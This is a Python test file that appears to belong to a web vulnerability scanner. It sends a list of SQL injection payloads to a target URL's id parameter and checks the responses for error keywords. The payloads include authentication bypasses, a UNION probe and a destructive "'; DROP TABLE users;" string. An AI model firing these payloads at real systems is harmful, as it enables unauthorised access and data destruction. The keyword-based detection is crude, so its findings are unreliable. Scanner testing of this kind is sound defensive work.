# tests/test_sql.py

import requests

# Define payloads for SQL injection tests
sql_payloads = [
    "' OR '1'='1",        # Basic SQL injection to bypass authentication
    "' OR 1=1 --",        # Comment-based SQL injection to bypass authentication
    "' OR 'a'='a' --",    # Another variant of SQL injection
    "'; DROP TABLE users;",  # Testing for destructive SQL commands
    "' OR '1'='1' UNION SELECT NULL, NULL, NULL --",  # Union-based SQL injection
    "' AND (SELECT COUNT(*) FROM users) > 0 --"  # Checking for error messages related to SELECT query
]

def test_sql_injection(url):
    """
    Tests for SQL injection vulnerabilities by sending various payloads and checking for error responses
    or unusual behavior indicating a possible SQL injection vulnerability.

    :param url: The base target URL to test for SQL injection vulnerabilities.
    :return: A list of results indicating whether the target is vulnerable to SQL injection for each payload.
    """
    results = []
    
    for payload in sql_payloads:
        try:
            # Construct the target URL with the SQL injection payload
            target_url = f"{url}?id={payload}"
            
            # Send GET request to the target URL
            response = requests.get(target_url)
            
            # Check for common SQL injection error messages in the response
            if any(error in response.text.lower() for error in ["syntax", "mysql", "error", "warning"]):
                results.append({
                    "payload": payload,
                    "vulnerable": True,
                    "reason": f"Error message indicating SQL syntax issues. Status code: {response.status_code}."
                })
            # Additional checks for unusual behavior indicating vulnerability (e.g., UNION, DROP)
            elif "success" in response.text.lower() or "database" in response.text.lower():
                results.append({
                    "payload": payload,
                    "vulnerable": True,
                    "reason": f"Possible SQL injection vulnerability detected. Status code: {response.status_code}."
                })
            else:
                results.append({
                    "payload": payload,
                    "vulnerable": False,
                    "reason": f"No SQL injection vulnerability detected. Status code: {response.status_code}."
                })
        
        except requests.exceptions.RequestException as e:
            # Handle network-related errors and add them to results
            results.append({
                "payload": payload,
                "vulnerable": False,
                "reason": f"Request failed: {e}"
            })
    
    return results
